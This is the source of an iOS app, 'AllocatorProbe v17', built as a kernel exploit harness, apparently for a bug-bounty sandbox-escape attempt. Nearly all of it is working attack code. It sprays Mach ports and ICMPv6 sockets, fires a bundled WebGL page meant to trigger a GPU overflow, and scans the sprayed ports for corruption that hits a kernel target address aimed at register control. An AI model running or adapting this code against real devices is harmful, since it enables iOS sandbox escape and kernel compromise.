/*
 * AllocatorProbe v17 — AFC File Logging + Broad Kotype Detection
 * ===============================================================
 * Changes from v15:
 *   - ADDED: File logging → Documents/scan_log.txt (AFC-readable without tunneld)
 *     Read via: python -m pymobiledevice3 afc cat \
 *       com.nexus.fengshui3.TMAQ26273N.TMAQ26273N Documents/scan_log.txt
 *   - ADDED: Log ALL non-zero kotype anomalies (not just >100) — any io_bits
 *     write by the overflow will show up regardless of exact value written
 *   - CHANGED: AGX fire interval 30s→500ms, MAX_FIRES 10→50
 *     More rapid fires = more overflow events, completes in ~28 seconds
 *   - References agxfire_v17.html (adds secondary draw, same 30-uvec4 shader)
 *   - Everything else from v15: idleTimerDisabled, %{public}s, GCD scan
 *
 * Detection thresholds in scan_background():
 *   kotype == 2 && kobject == COMMPAGE_TARGET → QUALIFYING_HIT (destroy port)
 *   kotype == 2 && kobject != COMMPAGE_TARGET → KOBJECT_WRONG (log value)
 *   kotype > 0 && kotype <= 100             → KOTYPE_ANOMALY (log value)
 *   kotype > 100                            → KOTYPE_FOREIGN (log value)
 *   ICMP corruption byte != 0xFF            → ICMP_CORRUPTION (log)
 *
 * Qualifying artifact target:
 *   Kernel panic IPS, kernel-mode x0 = 0x0000000FFFFFC330
 *   → ⚑ $125,000 App sandbox escape → Kernel register control
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#define NUM_PORTS        5000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define MAX_FIRES        50
#define FIRE_INTERVAL_MS 500

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[v17] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
                mach_port_destroy(mach_task_self(), g_ports[i]);
            } else {
                ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype == 2) {
            /* io_bits claims IKOT_TASK but wrong kobject */
            ev("IKOT_TASK_WRONG_KOBJECT port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        } else if (kotype > 0 && kotype <= 100) {
            /* Any non-zero low kotype is anomalous for a receive-right port */
            ev("KOTYPE_ANOMALY_LOW port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        } else if (kotype > 100) {
            ev("KOTYPE_FOREIGN port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    /* ICMPv6 canary check */
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKScriptMessageHandler>
@property (strong) UIWindow   *window;
@property (strong) WKWebView  *webView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("V17_LAUNCH AllocatorProbe v17 file-log rapid-fire");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"AllocatorProbe v17 — scanning";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    spray();

    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    [NSTimer scheduledTimerWithTimeInterval:3.0
                                     target:self
                                   selector:@selector(fireWebGL:)
                                   userInfo:nil repeats:NO];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

- (void)fireWebGL:(NSTimer *)t {
    ev("FIRE loading agxfire_v17.html in WKWebView");
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    WKPreferences *prefs = [WKPreferences new];
    prefs.javaScriptEnabled = YES;
    cfg.preferences = prefs;
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"nexus"];
    cfg.userContentController = ucc;

    self.webView = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];
    [self.window.rootViewController.view addSubview:self.webView];

    NSURL *url = [[NSBundle mainBundle] URLForResource:@"agxfire_v17" withExtension:@"html"];
    if (url) {
        [self.webView loadFileURL:url
          allowingReadAccessToURL:url.URLByDeletingLastPathComponent];
    } else {
        ev("ERROR agxfire_v17.html missing from bundle");
    }
}

- (void)userContentController:(WKUserContentController *)ucc
      didReceiveScriptMessage:(WKScriptMessage *)msg {
    ev("JS_MSG %s", [[msg.body description] UTF8String]);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
